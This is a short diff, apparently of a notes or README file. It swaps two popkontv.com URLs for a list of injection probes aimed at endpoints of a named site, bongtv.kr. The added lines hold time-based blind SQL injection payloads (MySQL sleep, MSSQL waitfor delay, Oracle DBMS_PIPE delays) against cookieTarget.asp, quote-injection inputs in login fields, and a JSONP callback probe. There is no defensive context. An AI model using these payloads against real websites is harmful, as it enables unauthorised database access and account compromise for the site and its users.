@@ -1,5 +1,14 @@
-www.popkontv.com/live/live_check.asp
-www.popkontv.com//json/liveApi_hls.asp
+www.bongtv.kr/cookieTarget.asp /(select(0)from(select(sleep(15)))v)/*'%2B(select(0)from(select(sleep(15)))v)%2B'"%2B(select(0)from(select(sleep(15)))v)%2B"*/&cookieTarget=3
+
+www.bongtv.kr/cookieTarget.asp / -1;%20waitfor%20delay%20'0:0:15'%20--%20&cookieTarget=3
+
+www.bongtv.kr/cookieTarget.asp /1*DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)%7C%7CCHR(99)%7C%7CCHR(99)%2C15)&cookieTarget=3
+
+www.bongtv.kr/sign/sign_form.asp / chk_saveId=IDWdDJbh&txt_id=1&txt_pw=u]H[ww6KrA9F.x-F
+
+www.bongtv.kr/json/unseApi.asp/ callback=HYJSONP
+
+www.bongtv.kr/style/common/sign/login.asp / &txt_id=1'"&txt_pw=u]H[ww6KrA9F.x-F
 
 
 # Vue3 템플릿 with Webpack
